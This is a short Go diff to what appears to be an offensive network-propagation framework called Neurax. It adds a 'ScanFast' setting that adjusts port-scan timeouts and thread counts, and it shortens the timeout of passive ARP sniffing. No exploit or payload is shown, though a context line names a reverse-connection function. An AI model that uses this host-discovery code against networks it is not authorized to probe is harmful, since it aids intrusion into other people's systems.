@@ -39,6 +39,7 @@ type __NeuraxConfig struct {
 	ScanPassive     bool
 	ScanTimeout     int
 	ScanAll         bool
+	ScanFast        bool
 	ReadArpCache    bool
 	Threads         int
 	FullRange       bool
@@ -67,6 +68,7 @@ var NeuraxConfig = __NeuraxConfig{
 	ScanPassive:     false,
 	ScanTimeout:     2,
 	ScanAll:         false,
+	ScanFast:        false,
 	ReadArpCache:    false,
 	Threads:         10,
 	FullRange:       false,
@@ -168,6 +170,10 @@ func IsHostActive(target string) bool {
 	last := 300
 	if NeuraxConfig.FullRange {
 		last = 65535
+	}
+	if NeuraxConfig.ScanFast {
+		NeuraxConfig.ScanTimeout = 3
+		NeuraxConfig.Threads = 20
 	}
 	ps := portscanner.NewPortScanner(target, time.Duration(NeuraxConfig.ScanTimeout)*time.Second, NeuraxConfig.Threads)
 	opened_ports := ps.GetOpenedPort(first, last)
@@ -337,7 +343,10 @@ func NeuraxReverse(proto string) {
 
 func neurax_scan_passive_single_iface(c chan string, iface string) {
 	var snapshot_len int32 = 1024
-	timeout := 5000000000 * time.Second
+	timeout := 500 * time.Second
+	if NeuraxConfig.ScanFast {
+		timeout = 50 * time.Second
+	}
 	handler, err := pcap.OpenLive(iface, snapshot_len, false, timeout)
 	ReportError("Cannot open device", err)
 	handler.SetBPFFilter("arp")
